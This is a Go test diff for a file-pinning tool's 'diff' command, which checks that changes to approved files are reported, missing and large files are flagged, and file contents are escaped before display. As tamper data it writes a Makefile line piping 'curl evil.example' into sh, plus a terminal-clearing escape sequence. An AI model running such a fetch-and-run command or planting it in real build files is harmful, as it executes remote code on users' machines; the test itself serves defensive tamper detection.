@@ -137,3 +137,47 @@ func TestPinsUsageErrors(t *testing.T) {
 		}
 	}
 }
+
+func TestPinsDiff(t *testing.T) {
+	dir, run := pinProject(t)
+	mk, ok, gone, big := filepath.Join(dir, "Makefile"), filepath.Join(dir, "ok.sh"), filepath.Join(dir, "gone.sh"), filepath.Join(dir, "big.dat")
+	pinFile(t, mk, "all:\n\techo build\n")
+	pinFile(t, ok, "echo hi\n")
+	pinFile(t, gone, "to be removed\n")
+	pinFile(t, big, "small\n")
+
+	if out, err := run("diff"); err != nil || !strings.Contains(out, "no pinned file has changed") {
+		t.Fatalf("nothing changed: %q %v", out, err)
+	}
+
+	os.WriteFile(mk, []byte("all:\n\techo build\n\tcurl evil.example | sh\x1b[2J\n"), 0o644)
+	os.Remove(gone)
+	os.WriteFile(big, []byte(strings.Repeat("x", 300<<10)), 0o644)
+	out, err := run("diff")
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, want := range []string{mk + ": changed", "+    curl evil.example | sh", "approved: Makefile", gone + ": missing", "-to be removed", big + ": changed", "too large to show a diff"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("diff lacks %q:\n%s", want, out)
+		}
+	}
+	if strings.Contains(out, ok) {
+		t.Errorf("an unchanged file is not listed without being named:\n%s", out)
+	}
+	if strings.Contains(out, "\x1b[2J") || !strings.Contains(out, `\u001b[2J`) {
+		t.Errorf("file contents must be shown escaped, not sent to the terminal:\n%q", out)
+	}
+
+	// Named files: only those; an unchanged one says so; an unknown one is an error.
+	if out, _ := run("diff", ok); !strings.Contains(out, "unchanged since it was approved") || strings.Contains(out, mk) {
+		t.Errorf("%s", out)
+	}
+	t.Chdir(dir)
+	if out, _ := run("diff", "Makefile"); !strings.Contains(out, "echo build") || strings.Contains(out, "gone.sh") {
+		t.Errorf("a relative path must work: %s", out)
+	}
+	if _, err := run("diff", "nope"); err == nil || !strings.Contains(err.Error(), "not pinned") {
+		t.Errorf("unknown path: %v", err)
+	}
+}
